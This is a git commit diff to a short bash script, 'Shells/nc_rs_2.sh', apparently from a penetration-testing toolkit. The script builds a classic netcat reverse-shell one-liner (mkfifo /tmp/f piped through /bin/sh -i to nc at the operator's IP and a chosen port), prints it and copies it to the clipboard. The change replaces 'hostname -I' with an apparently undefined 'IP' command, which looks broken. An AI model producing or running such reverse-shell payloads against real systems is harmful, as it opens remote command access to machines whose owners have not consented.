47d2ec0c9fd2b84e5506d4adbeea6894ad452f5f
neogeo56 <54796086+neogeo56@users.noreply.github.com>
2019-12-10 10:23:21 -0600

    Update nc_rs_2.sh

--- Shells/nc_rs_2.sh
+++ Shells/nc_rs_2.sh
@@ -1,5 +1,5 @@
-#!/bin/bash
-IP=$( hostname -I );
-New_IP=$( echo -n $IP );
+#!/bin/bash                                                       
+IP=$( IP );                      
+New_IP=$( echo -n $IP );                                                                                                              
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $New_IP $1 >/tmp/f";
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $New_IP $1 >/tmp/f" | clip;
